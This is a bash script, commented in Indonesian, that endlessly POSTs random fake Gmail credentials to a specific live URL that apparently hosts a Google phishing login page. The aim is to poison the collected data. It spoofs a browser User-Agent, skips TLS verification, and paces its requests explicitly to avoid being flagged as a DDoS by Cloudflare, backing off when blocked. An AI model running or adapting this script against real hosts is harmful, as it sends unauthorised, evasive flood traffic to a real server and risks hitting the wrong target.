#!/bin/bash

TARGET="https://videeyavs.nejtoahi.web.id/phcode.php"

echo "Memulai pengiriman data sampah ke target..."

while true; do
  # Bikin data acak
  USER=$(head /dev/urandom | tr -dc a-z0-9 | head -c 10)"@gmail.com"
  PASS=$(head /dev/urandom | tr -dc a-z0-9 | head -c 14)
  
  # Kirim request dan ambil status code-nya saja
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -d "email=$USER&password=$PASS&login=Google")

  if [ "$STATUS" == "302" ] || [ "$STATUS" == "200" ]; then
    echo "[SUCCESS] Data terkirim: $USER | Status: $STATUS"
  else
    echo "[BLOCKED/ERROR] Server merespon: $STATUS"
    # Kalau kena block, istirahat lebih lama
    sleep 5
  fi

  # Delay tipis biar nggak dianggap DDoS kasar oleh Cloudflare
  sleep 0.5
done
